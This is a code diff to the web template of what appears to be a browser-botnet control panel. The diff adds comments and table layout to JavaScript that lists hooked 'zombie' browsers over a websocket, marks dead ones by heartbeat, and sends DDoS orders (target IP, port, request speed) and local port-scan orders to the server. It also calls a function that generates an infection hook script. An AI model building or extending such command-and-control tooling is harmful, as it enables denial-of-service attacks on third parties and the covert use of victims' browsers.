@@ -62,7 +62,9 @@
 
 
 var websocket = null;
+//list of zombies
 var zombies = {};
+
 $(function(){
 
 	websocket = new WebSocket('{{WEBSOCKET_URI}}attacker?subscribe-session');
@@ -82,8 +84,11 @@ $(function(){
 							//mark dead
 							$("#"+json["newzombieId"]).css("background-color","#ff0000");
 					},10000);
+					//append new zombie to list
 					$("table[name='zombies']").append(	"<tr class='active'><td class='clickable-row' style='background-color:#00ff00' id="+json['newzombieId']+">"+json['newzombieHost']+"</td></tr>");
+					//allow for clickable function
 					$("table[name='zombies'] tr").click(function(){
+						//only allow one zombie to be selected
 								$("tr").css("border","");
 								$(this).css("border","3px solid black");
 								$("tr").removeClass("selected");
@@ -91,6 +96,7 @@ $(function(){
 					});
 				}
 				else{
+					//zombie that exists is sending heartbeat
 					clearInterval(zombies[json['newzombieId']]);
 					$("#"+json['newzombieId']).css("background-color","#00ff00");
 					zombies[json['newzombieId']]=setTimeout(function(){
@@ -102,12 +108,13 @@ $(function(){
 			}
 			//update from portscan
 			else if(json.hasOwnProperty("host")==true){
-					console.log("host");
+					//add new found host to hosts list
 					$("tbody[name='hosts']").append(	"<tr class='active'><td>"+json['host']+"</td></tr>");
 			}
 		}
 		catch(e){
 			//heartbeat
+			//do nothing
 		}
 
 	}
@@ -116,28 +123,42 @@ $(function(){
 
 });
 
-
+//tell server to tell zombies to ddos
 function ddos(){
-
+	//target ip to ddos
 	var targ = $("#ip").val();
+	//target port to ddos
 	var port = $("#port").val();
+
 	targ = targ+":"+port;
+	//with what speed to ddos(time between requests)
 	var timeout = $("#timeout").val();
 	$.ajax({
 		url:"{% url 'control-ddos'%}",
 		type:'POST',
 		dataType:"json",
-		data:{'targetip':targ,'timeout':timeout}
+		data:{'targetip':targ,'timeout':timeout},
+		success: function(json){
+			if(json.hasOwnProperty('ack')==true){
+				bootbox.alert("DDOS started");
+			}
+			else{
+				bootbox.alert("DDOS failed");
+			}
+		}
 	});
 }
 
-
+//tell server to tell zombie to portscan
 function portscan(){
+	//get which zombie was selected
 	var targ = $(".selected td").html();
+	//was a target selected
 	if(targ==undefined){
 		bootbox.alert("please select a zombie");
 		return;
 	}
+	//empty the scanned hosts table
 	$("tbody[name='hosts']").empty();
 	$.ajax({
 		url:"{% url 'control-localportscan' %}",
@@ -156,6 +177,7 @@ function portscan(){
 
 }
 
+//cancel an attack
 function cancel(){
 		$.ajax({
 			url:"{% url 'control-cancel'%}",
@@ -165,7 +187,7 @@ function cancel(){
 		});
 
 }
-
+//create hook script
 function createHook(){
 	var ipserver = $('#server_ip').val()
 	$.ajax({
@@ -181,7 +203,7 @@ function createHook(){
 	});
 }
 
-
+//show the ddos form
 function showDdos(){
 
 	$("div[name='currentattack']").empty();
@@ -189,20 +211,47 @@ function showDdos(){
 	<div class="form-inline" >\
 		<h4>DDOS Attack</h4>\
 		<div class="form-group">\
-		<label for="ip">IP</label>\
-		<input type="text" class="form-control" id="ip" placeholder="ip address">\
-		<label for="port">Port</label>\
-		<input type="text" class="form-control" id="port" placeholder="port">\
-			<label for="timeout">Speed</label>\
-			<input type="text" class="form-control" id="timeout" placeholder="speed">\
+			<table>\
+				<tr>\
+					<td>\
+					<label for="ip">IP</label>\
+					</td>\
+					<td>\
+					<input type="text" class="form-control" id="ip" placeholder="ip address">\
+					</td>\
+				</tr>\
+				<tr>\
+					<td>\
+					<label for="port">Port</label>\
+					</td>\
+					<td>\
+					<input type="text" class="form-control" id="port" placeholder="port">\
+					</td>\
+				</td>\
+				<tr>\
+					<td>\
+					<label for="timeout">Speed</label>\
+					</td>\
+					<td>\
+					<input type="text" class="form-control" id="timeout" placeholder="speed">\
+					</td>\
+				</tr>\
+			</table>\
 		</div>\
-		<button onclick="ddos();" class="btn btn-default">Start Attack</button>\
-		<button onclick="cancel();" class="btn btn-default">Cancel</button>\
+		<div>\
+			<table>\
+				<tr>\
+			<button onclick="ddos();" class="btn btn-default">Start Attack</button>\
+				</tr>\
+				<tr>\
+			<button onclick="cancel();" class="btn btn-default">Cancel</button>\
+				</tr>\
+		</table>\
 		</div>\
 	</div>');
 
 }
-
+//show the portscan form
 function showPortScan(){
 	$("div[name='currentattack']").empty();
 	$("div[name='currentattack']").append('	<div class="portscan">\
@@ -212,8 +261,16 @@ function showPortScan(){
 					<label for="timeout">Speed</label>\
 					<input type="text" class="form-control" id="timeout" placeholder="speed">\
 				</div>\
-				<button onclick="portscan();" class="btn btn-default">Start Attack</button>\
-				<button onclick="cancel();" class="btn btn-default">Cancel</button>\
+				<div>\
+					<table>\
+						<tr>\
+							<button onclick="portscan();" class="btn btn-default">Start Attack</button>\
+						</tr>\
+						<tr>\
+							<button onclick="cancel();" class="btn btn-default">Cancel</button>\
+					  </tr>\
+					</table>\
+				</div>\
 			</div>\
 		</div>\
 		<div class="hosts">\
@@ -226,21 +283,8 @@ function showPortScan(){
 }
 
 
-
 $(function(){createHook();})
-/*
-$(function(){$(".ddos").hide();})
-$(function(){$(".portscan").hide();})
-$(function(){$(".hosts").hide();})
 
-function drop(input){
-	$("."+input).toggle();
-
-	if(input.match("portscan")){
-		$(".hosts").toggle();
-	}
-
-}*/
 
 
 </script>
@@ -262,11 +306,6 @@ function drop(input){
 				<h1 style="text-align: center;"><small>Zombies</small></h1>
 			<table class ="table table-condensed" name="zombies">
 				<tbody>
-		<!--		{%for zombie in zombies%}
-				<tr class="active">
-					<td id={{zombie.id}}>{{zombie.host}} <span class ="glyphicon glyphicon-flash"></span></td>
-				</tr>
-				{%endfor%}-->
 			</tbody>
 			</table>
 		</div>
